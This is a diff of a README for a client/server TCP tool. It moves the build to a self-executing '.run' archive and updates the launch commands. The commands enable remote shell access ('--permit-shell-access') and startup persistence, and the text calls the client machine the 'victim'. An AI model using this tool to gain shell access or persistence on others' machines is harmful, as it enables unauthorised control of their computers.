@@ -30,15 +30,21 @@ It has a make script so in terminal so just run
 ```
 make
 ```
-This will create a zip with two executables "rvc-tcp-client" and "rvc-tcp-server"
-Copy this zip on different computers and use client and server accordingly
+This will create a self executing compressed archive "rvc-tcp-station.run"
+Copy this file on different computers and use client and server accordingly
+
+To compile server and client binary without creating the run archive,
+you can make these targets separately as
+'''
+make server; make client
+'''
 
 ## Deployment
 
 On the terminal of PC you have decided to keep as server run rvc-tcp-server
 
 ```
-./rvc-tcp-server (port no)
+./rvc-tcp-station.run --run-server (port no)
 ```
 The clients can connect via your hostname so you can give a unique host name
 by running the following command as Root:
@@ -51,7 +57,7 @@ To show your current hostname just run above command with no arguments.
 On any PC where you have to open the client,
 
 ```
-./rvc-tcp-client (hostname/ip address of server) (port no) -reconnect --permit-shell-access --preset-uname (client username)
+./rvc-tcp-station.run --run-client (hostname/ip address of server) (port no) -reconnect --permit-shell-access --preset-uname (client username)
 ```
 where --permit-shell-access flag is optional enabling any user to execute shell commands on your PC 
 and --preset-uname sets username without stdin in commandline itself it is also optional
@@ -66,13 +72,13 @@ We have an intuitive and interactive script that will launch the client with
 above parameters automatically. For that run
 
 ```
-./rvc-tcp-station
+./rvc-tcp-station.run
 ```
 One can also set the client as a startup service via this script 
 to uninstall the client from startup service (if exist) just send -u flag to this script
 to do it in single commandline itself
 ```
-./rvc-tcp-station -u
+./rvc-tcp-station.run -u
 ```
 If you want to completely and remotely uninstall the client from remote pc, on RSH of victim in your client program you can send command
 ```
